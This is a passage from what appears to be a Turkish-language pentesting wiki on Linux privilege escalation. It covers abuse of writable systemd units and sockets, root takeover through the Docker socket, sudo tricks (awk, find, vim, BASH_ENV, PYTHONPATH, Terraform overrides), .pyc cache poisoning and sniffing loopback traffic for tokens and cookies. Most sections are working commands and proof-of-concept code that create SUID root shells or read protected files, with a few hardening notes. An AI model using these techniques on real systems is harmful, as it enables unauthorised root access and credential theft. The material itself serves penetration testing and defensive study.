Herhangi bir klasöre **write** erişiminiz olduğunu fark ederseniz, **privilege escalation** gerçekleştirebilirsiniz. Şunlar gibi servis yapılandırma dosyalarında kullanılan **relative paths** ifadelerini aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ardından, yazma izniniz olan systemd PATH klasörü içinde **relative path binary** ile **aynı ada sahip** bir **executable** oluşturun. Servisten güvenlik açığı bulunan eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde **backdoor**'unuz çalıştırılır (yetkisiz kullanıcılar genellikle servisleri başlatamaz/durduramaz, ancak `sudo -l` kullanıp kullanamadığınızı kontrol edin).

**`man systemd.service` ile servisler hakkında daha fazla bilgi edinin.**

## **Timers**

**Timers**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Timers**, yerleşik calendar time events ve monotonic time events desteğine sahip oldukları ve asynchronous olarak çalıştırılabildikleri için cron'a alternatif olarak kullanılabilir.

Tüm timers'ları şu komutla enumerate edebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timer'lar

Bir timer'ı değiştirebiliyorsanız, systemd.unit'in mevcut birimlerinden bazılarını (örneğin bir `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğunu okuyabilirsiniz:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse bu değer, son ek dışında timer unit ile aynı ada sahip bir service olarak varsayılanır. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adı için, son ek dışında aynı adın kullanılması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **Yazılabilir bir binary çalıştıran** bazı systemd unit'lerini (örneğin bir `.service`) bulun
- **Relative path çalıştıran** ve **systemd PATH** üzerinde **yazma yetkilerinizin** bulunduğu bir systemd unit bulun (bu executable'ı taklit etmek için)

**Timer'lar hakkında daha fazla bilgi için `man systemd.timer` komutunu çalıştırın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root yetkilerine sahip olmanız ve şunu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` üzerinde bir symlink oluşturarak **timer**'ın **activated** olduğunu unutmayın.

## Sockets

Unix Domain Sockets (UDS), client-server modelleri içinde aynı veya farklı makinelerde **process communication** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Sockets, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Sockets hakkında daha fazla bilgi için `man systemd.socket` komutunu kullanın.** Bu dosya içinde çeşitli ilgi çekici parametreler yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak bir özet olarak **socket'in nerede listen edeceğini belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, listen edilecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. **true** ise her gelen bağlantı için bir **service instance oluşturulur** ve yalnızca bağlantı socket'i bu instance'a aktarılır. **false** ise tüm listening socket'leri **başlatılan service unit'e aktarılır** ve tüm bağlantılar için yalnızca bir service unit oluşturulur. Bu değer, datagram socket'leri ve FIFO'lar için yok sayılır; bu durumlarda gelen tüm trafik koşulsuz olarak tek bir service unit tarafından işlenir. **Varsayılan değer false'dur**. Performans nedenleriyle yeni daemon'ları yalnızca `Accept=no` için uygun olacak şekilde yazmanız önerilir.
- `ExecStartPre`, `ExecStartPost`: Listening **socket'leri**/FIFO'lar sırasıyla **oluşturulmadan** ve bind edilmeden **önce** veya **sonra** çalıştırılan bir ya da daha fazla command line alır. Command line'ın ilk token'ı absolute filename olmalı, ardından process için argümanlar gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Listening **socket'leri**/FIFO'lar sırasıyla **kapatılmadan** ve kaldırılmadan **önce** veya **sonra** çalıştırılan ek **command'lerdir**.
- `Service`: **incoming traffic** durumunda **activate edilecek service unit** adını belirtir. Bu ayara yalnızca `Accept=no` olan socket'lerde izin verilir. Varsayılan olarak socket ile aynı adı taşıyan service'i kullanır (suffix değiştirilir). Çoğu durumda bu seçeneğin kullanılması gerekli olmamalıdır.

### Writable .socket files

Bir **writable** `.socket` dosyası bulursanız `[Socket]` bölümünün başlangıcına şu tür bir satır **ekleyebilirsiniz**: `ExecStartPre=/home/kali/sys/backdoor`; böylece backdoor socket oluşturulmadan önce çalıştırılır. Bu nedenle **muhtemelen makinenin reboot edilmesini beklemeniz gerekir.**\
_Sistem bu socket file configuration'ını kullanıyor olmalıdır; aksi takdirde backdoor çalıştırılmaz._

### Socket activation + writable unit path (create missing service)

Bir diğer yüksek etkili misconfiguration şudur:

- `Accept=no` ve `Service=<name>.service` içeren bir socket unit
- referans verilen service unit mevcut değil
- bir attacker `/etc/systemd/system` (veya başka bir unit search path) içine yazabiliyor

Bu durumda attacker `<name>.service` dosyasını oluşturabilir, ardından socket'e traffic göndererek systemd'nin yeni service'i root olarak yükleyip execute etmesini sağlayabilir.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Yazılabilir socketler

Herhangi bir **yazılabilir socket** (_burada config `.socket` dosyalarından değil, Unix Socket'lerden bahsediyoruz_) **belirlerseniz**, bu socket ile **iletişim kurabilir** ve muhtemelen bir güvenlik açığından yararlanabilirsiniz.

### Unix Socket'lerini Enumerate Etme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation örneği:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **HTTP** isteklerini dinleyen **socket**'ler olabileceğini unutmayın (_Burada .socket dosyalarından değil, Unix socket olarak çalışan dosyalardan bahsediyorum_). Bunu şu şekilde kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Socket bir **HTTP** isteğine yanıt veriyorsa onunla **iletişim kurabilir** ve belki de **bazı güvenlik açıklarından yararlanabilirsiniz**.

### Yazılabilir Docker Socket'i

Genellikle `/var/run/docker.sock` konumunda bulunan Docker socket'i, güvenliği sağlanması gereken kritik bir dosyadır. Varsayılan olarak bu dosya `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e yazma erişimine sahip olmak, yetki yükseltmeye yol açabilir. Aşağıda bunun nasıl yapılabileceği ve Docker CLI kullanılabilir değilse uygulanabilecek alternatif yöntemler açıklanmıştır.

#### **Docker CLI ile Yetki Yükseltme**

Docker socket'ine yazma erişiminiz varsa aşağıdaki komutları kullanarak yetkilerinizi yükseltebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişim sağlayan bir container çalıştırmanıza olanak tanır.

#### **Docker API Directly Kullanma**

Docker CLI kullanılabilir olmadığında, Docker socket yine de Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **Docker Images Listeleme:** Kullanılabilir image'ların listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Container Oluşturma:** Host sisteminin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Container'a Bağlanma:** Container'a bağlantı kurmak ve içinde komut çalıştırmayı etkinleştirmek için `socat` kullanın.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimle doğrudan container içinde komut çalıştırabilirsiniz.

### Diğerleri

`docker` socket üzerinde yazma izinlerine sahipseniz, bunun **`docker` grubunun içinde** olmanızdan kaynaklanabileceğini ve [**privilege escalation için daha fazla yol**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) bulunduğunu unutmayın. [**Docker API bir port üzerinde dinleme yapıyorsa**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising) onu da compromise edebilirsiniz.

**Container'lardan breakout gerçekleştirmek veya privilege escalation için container runtime'larını kötüye kullanmak** hakkında daha fazla yöntemi burada bulabilirsiniz:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`**ctr**` komutunu kullanabildiğinizi fark ederseniz, **privilege escalation için onu kötüye kullanabilecek olabileceğinizden** aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`**runc**` komutunu kullanabildiğinizi fark ederseniz, **privilege escalation için onu kötüye kullanabilecek olabileceğinizden** aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **Process'ler arası İletişim (IPC) sistemi**dir. Modern Linux sistemi göz önünde bulundurularak tasarlanmış olup, farklı uygulama iletişimi biçimleri için sağlam bir framework sunar.

Sistem oldukça esnektir; **geliştirilmiş UNIX domain socket'lerini** andıran ve process'ler arasındaki veri alışverişini iyileştiren temel IPC'yi destekler. Ayrıca event veya signal'ların broadcast edilmesine yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, gelen bir çağrı hakkında Bluetooth daemon'undan gelen bir signal, bir music player'ın sesi kapatmasını sağlayarak kullanıcı deneyimini iyileştirebilir. Buna ek olarak D-Bus, uzak bir object system'ini destekler; uygulamalar arasındaki service request'lerini ve method invocation'larını basitleştirerek geleneksel olarak karmaşık olan process'leri kolaylaştırır.

D-Bus, message izinlerini (method call'ları, signal emission'ları vb.) eşleşen policy rule'larının kümülatif etkisine göre yöneten bir **allow/deny modeli** kullanır. Bu policy'ler bus ile olan etkileşimleri belirler ve bu izinlerin exploit edilmesi yoluyla privilege escalation'a olanak sağlayabilir.

Böyle bir policy örneği `/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasında verilmiştir. Bu policy, root user'ın `fi.w1.wpa_supplicant1` üzerinden object sahibi olması, buraya message göndermesi ve buradan message alması için gereken izinleri ayrıntılandırır.

Belirli bir user veya group belirtilmeyen policy'ler evrensel olarak uygulanırken, "default" context policy'leri diğer belirli policy'ler tarafından kapsanmayan her şey için geçerlidir.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Buradan bir D-Bus iletişimini enumerate etmeyi ve exploit etmeyi öğrenin:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Makinenin ağını enumerate etmek ve konumunu belirlemek her zaman ilgi çekicidir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering hızlı triyajı

Host komut çalıştırabiliyor ancak callback'ler başarısız oluyorsa DNS, transport, proxy ve route filtering'i hızlıca birbirinden ayırın:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Açık portlar

Makineye erişmeden önce, daha önce etkileşim kuramadığınız makinede çalışan ağ hizmetlerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Dinleyicileri bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde dışa açıktır.
- `127.0.0.1` / `::1`: yalnızca yereldir (tünel/forward adayları için uygundur).
- Belirli dahili IP'ler (ör. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden erişilebilir.

### Yalnızca yerel servisler için triage iş akışı

Bir hostu compromise ettiğinizde, `127.0.0.1` adresine bind edilmiş servisler çoğu zaman shell'inizden ilk kez erişilebilir hâle gelir. Hızlı bir yerel iş akışı şöyledir:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS bir network scanner olarak (yalnızca ağ modu)

Yerel PE kontrollerine ek olarak linPEAS, odaklanmış bir network scanner olarak çalışabilir. `$PATH` içindeki mevcut binary'leri (genellikle `fping`, `ping`, `nc`, `ncat`) kullanır ve tooling yüklemez.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-t` olmadan `-d`, `-p` veya `-i` seçeneklerinden birini kullanırsanız, linPEAS salt bir network scanner gibi davranır (ayrıcalık yükseltme kontrollerinin geri kalanını atlar).

### Sniffing

Trafiği sniff edip edemediğinizi kontrol edin. Eğer edebiliyorsanız bazı kimlik bilgilerini ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
Hızlı pratik kontroller:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`), post-exploitation aşamasında özellikle değerlidir; çünkü yalnızca dahili erişime açık birçok servis burada token/cookie/credential bilgilerini açığa çıkarır:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Şimdi yakala, sonra ayrıştır:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Kullanıcılar

### Genel Enumeration

**kim** olduğunuzu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root ayrıcalıklarına** sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** değerine sahip kullanıcıların ayrıcalıklarını yükseltmesine olanak tanıyan bir bug'dan etkilenmiştir. Daha fazla bilgi için: [buraya](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [buraya](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [buraya](https://twitter.com/paragonsec/status/1071152249529884674) bakın.\
**Exploit etmek** için: **`systemd-run -t /bin/bash`**

### Gruplar

Sizi root ayrıcalıkları sağlayabilecek bir **grubun üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Password Policy
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Ortamın **herhangi bir parolasını biliyorsanız**, bu parolayı kullanarak **her kullanıcıyla login olmaya** çalışın.

### Su Brute

Çok fazla gürültü oluşturmaktan çekinmiyorsanız ve bilgisayarda `su` ile `timeout` binary'leri mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcılar üzerinde brute-force deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), `-a` parametresiyle kullanıcılar üzerinde brute-force yapmayı da dener.

## Writable PATH abuses

### $PATH

**$PATH içindeki bir klasöre yazabildiğinizi** tespit ederseniz, **yazılabilir klasörün içinde bir backdoor oluşturarak** privilege escalation gerçekleştirebilirsiniz. Bu backdoor, farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak bir komutun adıyla oluşturulmalı ve bu komut **$PATH içinde yazılabilir klasörünüzden önce bulunan bir klasörden yüklenmemelidir**.

### SUDO and SUID

sudo kullanarak bazı komutları çalıştırmanıza izin verilebilir veya bu komutlarda suid biti bulunabilir. Şunu kullanarak kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza, hatta bir komut çalıştırmanıza olanak tanır.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte `demo` kullanıcısı `vim` komutunu `root` olarak çalıştırabilir; root dizinine bir SSH anahtarı ekleyerek veya `sh` çağırarak shell elde etmek artık çok kolaydır.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi yürütürken **ortam değişkeni ayarlamasına** olanak tanır:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB makinesi Admirer temel alınarak**, script'i root olarak çalıştırırken keyfi bir Python library yüklemek için **PYTHONPATH hijacking** işlemine karşı **savunmasızdı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo-allowed Python imports içinde yazılabilir `__pycache__` / `.pyc` poisoning

Bir **sudo-allowed Python script**, paketin dizininde **yazılabilir bir `__pycache__`** bulunan bir modülü import ediyorsa, cached `.pyc` dosyasını değiştirerek bir sonraki import işleminde privileged user olarak code execution elde edebilirsiniz.

- Nasıl çalışır:
- CPython, bytecode cache dosyalarını `__pycache__/module.cpython-<ver>.pyc` konumunda depolar.
- Interpreter, **header**'ı (magic + source ile ilişkili timestamp/hash metadata'sı) doğrular, ardından bu header'dan sonra depolanan marshaled code object'i çalıştırır.
- Dizin yazılabilir olduğu için cached dosyayı **silip yeniden oluşturabiliyorsanız**, root-owned ancak yazılamayan bir `.pyc` dosyası yine de değiştirilebilir.
- Tipik path:
- `sudo -l`, root olarak çalıştırabileceğiniz bir Python script veya wrapper gösterir.
- Bu script, `/opt/app/`, `/usr/local/lib/...` vb. konumlardan local bir modülü import eder.
- Import edilen modülün `__pycache__` dizini user'ınız veya herkes tarafından yazılabilir durumdadır.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Ayrıcalıklı script'i inceleyebiliyorsanız, içe aktarılan modülleri ve bunların önbellek yolunu belirleyin:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
İstismar iş akışı:

1. Python'ın meşru cache dosyasını henüz mevcut değilse oluşturması için sudo izni verilen script'i bir kez çalıştırın.
2. Meşru `.pyc` dosyasının ilk 16 byte'ını okuyun ve zehirlenmiş dosyada yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, orijinal cache dosyasını silin ve orijinal header ile kötü amaçlı bytecode'u birleştirerek dosyayı yeniden oluşturun.
4. İçe aktarma işleminin payload'unuzu root olarak çalıştırması için sudo izni verilen script'i yeniden çalıştırın.

Önemli notlar:

- Orijinal header'ı yeniden kullanmak önemlidir; çünkü Python cache metadata'sını bytecode gövdesinin gerçekten source ile eşleşip eşleşmediğine göre değil, source dosyasına göre kontrol eder.
- Bu yöntem özellikle source dosyası root-owned ve yazılabilir değilken, dosyanın bulunduğu `__pycache__` dizini yazılabilir durumdaysa kullanışlıdır.
- Privileged process `PYTHONDONTWRITEBYTECODE=1` kullanıyorsa, güvenli izinlere sahip bir konumdan import yapıyorsa veya import path içindeki tüm dizinlere yazma erişimi kaldırılmışsa attack başarısız olur.

Minimal proof-of-concept şekli:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Sertleştirme:

- `__pycache__` dahil, ayrıcalıklı Python import path içindeki hiçbir dizinin düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmadığından emin olun.
- Ayrıcalıklı çalıştırmalar için `PYTHONDONTWRITEBYTECODE=1` kullanmayı ve beklenmeyen yazılabilir `__pycache__` dizinleri için periyodik kontroller yapmayı değerlendirin.
- Yazılabilir yerel Python modüllerine ve yazılabilir cache dizinlerine, root tarafından çalıştırılan yazılabilir shell script'leri veya paylaşılan kütüphanelerle aynı şekilde yaklaşın.

### sudo env_keep üzerinden korunan BASH_ENV → root shell

sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çağırırken root olarak arbitrary code çalıştırmak için Bash'in non-interactive startup davranışından yararlanabilirsiniz.

- Nasıl çalışır: Non-interactive shell'ler için Bash, hedef script'i çalıştırmadan önce `$BASH_ENV` değerini değerlendirir ve bu dosyayı source eder. Birçok sudo kuralı bir script'in veya shell wrapper'ın çalıştırılmasına izin verir. `BASH_ENV` sudo tarafından korunuyorsa dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (non-interactively `/bin/bash` çağıran herhangi bir hedef veya herhangi bir bash script'i).
- `BASH_ENV`'in `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `BASH_ENV` (ve `ENV`) öğesini `env_keep` içinden kaldırın, `env_reset` kullanmayı tercih edin.
- Sudo tarafından izin verilen komutlar için shell wrapper'larından kaçının; minimal binary'ler kullanın.
- Korunan env değişkenleri kullanıldığında sudo I/O logging ve alerting kullanmayı değerlendirin.

### Terraform via sudo with preserved HOME (!env_reset)

Sudo environment'ı (`!env_reset`) olduğu gibi bırakırken `terraform apply` komutuna izin veriyorsa, `$HOME` çağrıyı yapan kullanıcı olarak kalır. Bu nedenle Terraform, **$HOME/.terraformrc** dosyasını root olarak yükler ve `provider_installation.dev_overrides` ayarını dikkate alır.

- Gerekli provider'ı yazılabilir bir directory'ye yönlendirin ve provider'ın adını taşıyan kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform, Go plugin handshake işlemini başarısız kılar ancak sonlanmadan önce payload'ı root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR overrides + symlink validation bypass

Terraform değişkenleri, `TF_VAR_<name>` ortam değişkenleri üzerinden sağlanabilir; sudo ortamı koruduğunda bu değişkenler de korunur. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf doğrulamalar symlinks kullanılarak bypass edilebilir:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink'i çözer ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'leri önceden oluşturarak ayrıcalıklı konumlara **yazmak** için de kullanılabilir (ör. provider'ın hedef yolunu `/etc/cron.d/` içindeki bir konuma işaret edecek şekilde).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo, sudo'nun yalnızca etkileşimli bir TTY'den çalışmasını zorunlu kılan `requiretty` ile yapılandırılabilir. `!requiretty` ayarlanmışsa (veya seçenek mevcut değilse), sudo reverse shell'ler, cron job'ları ya da script'ler gibi etkileşimsiz bağlamlardan çalıştırılabilir.
```bash
Defaults !requiretty
```
